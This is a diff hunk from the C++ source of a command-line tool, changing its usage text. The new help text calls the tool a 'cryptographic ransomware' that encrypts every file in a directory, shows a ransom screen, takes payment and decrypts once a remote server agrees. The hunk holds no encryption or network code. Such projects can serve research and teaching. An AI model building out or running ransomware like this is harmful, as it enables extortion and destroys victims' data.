@@ -190,12 +190,12 @@ void ArgumentParser::showUsage() const
                         + std::string(PROJECT_NAME) + " --decrypt /home/butterfly/data/ --key /home/butterfly/butterfly/masterkeys/SPrivateRSA.pem\n\n"
 
                + "Options:\n"
-                        + "\t-d,   --dir         Directory Path to start the Hybrid Encryption Mechanism (Encryption+Decryption)\n"
-                        + "\t-enc, --encrypt\t    Encrypts all files in provided directory\n"
-                        + "\t-dec, --decrypt\t    Decrypts all files in provided directory, if the request to the Server was successful\n"
-                        + "\t-k,   --key         Masterkey for the Decryption (Corresponds to the embedded Server Public Key)\n"
-                        + "\t-p,   --protected   Save all key files to the System\n"
-                        + "\t-c,   --config\t    Logger Config Path\n"
+                        + "\t-d,   --dir         Directory path to start the cryptographic ransomware (Encryption+Visualization+Payment+Decryption)\n"
+                        + "\t-enc, --encrypt\t    Encrypts all files in provided directory path and shows the ransom visualization\n"
+                        + "\t-dec, --decrypt\t    Decrypts all files in provided directory path, if the request to the remote server was successful\n"
+                        + "\t-k,   --key         Masterkey for the decryption, if the remote server is not used (Corresponds to the embedded server public key)\n"
+                        + "\t-p,   --protected   Saves all key files to the system (For manual decryption)\n"
+                        + "\t-c,   --config\t    Logger config path\n"
                         + "\t-v,   --version\t    Show version information and quit\n"
                         + "\t-h,   --help\t    Show this message and quit"
 
